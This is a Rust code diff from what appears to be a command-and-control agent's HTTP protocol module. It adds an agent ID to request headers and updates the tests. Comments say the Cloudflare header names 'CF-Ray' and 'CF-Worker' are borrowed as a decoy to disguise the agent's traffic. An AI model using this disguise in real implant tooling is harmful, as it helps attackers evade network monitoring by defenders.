@@ -112,7 +112,7 @@ impl<E> Sender for JsonProtocol<E>
 		                   .body(data.to_vec())
 		                   .header("Content-Type", "text/plain")
 			// Add the request ID to the headers. Borrowed the cloudflare header name for decoy.
-			               .header("CF-Ray", metadata.request_id.to_string())
+			.header("CF-Ray", format!("{}.{}", metadata.request_id.to_string(), metadata.agent_id.to_string()))
 			// Add the command ID to the headers. Borrowed the cloudflare header name for decoy.
 			               .header("CF-Worker", metadata.command_id.to_string())
 		                   .send()
@@ -189,7 +189,6 @@ mod tests {
 	use serde::Deserialize;
 	use tokio::select;
 	use tokio_util::sync::CancellationToken;
-	use uuid::uuid;
 
 	use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
 
@@ -214,12 +213,13 @@ mod tests {
 	}
 
 	impl WithMetadata for SampleData {
-		fn get_metadata(&self) -> Metadata {
-			Metadata {
-				request_id: uuid!("00000000-0000-0000-0000-000000000000"),
-				command_id: uuid!("00000000-0000-0000-0000-000000000000"),
+		fn get_metadata(&self) -> Arc<Metadata> {
+			Arc::new(Metadata {
+				request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
+				command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
+				agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
 				path: None,
-			}
+			})
 		}
 	}
 
@@ -247,8 +247,8 @@ mod tests {
 		let cancellation_token = CancellationToken::new();
 		let handler = |headers: HeaderMap, body: Bytes| async move {
 			assert_eq!(headers.get("content-type").unwrap(), "text/plain");
-			assert_eq!(headers.get("cf-ray").unwrap(), "00000000-0000-0000-0000-000000000000");
-			assert_eq!(headers.get("cf-worker").unwrap(), "00000000-0000-0000-0000-000000000000");
+			assert_eq!(headers.get("cf-ray").unwrap(), "an3a8hlnrr4638d30yef0oz5sncjdx5v.an3a8hlnrr4638d30yef0oz5sncjdx5x");
+			assert_eq!(headers.get("cf-worker").unwrap(), "an3a8hlnrr4638d30yef0oz5sncjdx5w");
 
 			let mut check = BytesMut::new();
 			for i in magic_numbers::JSON.iter() {
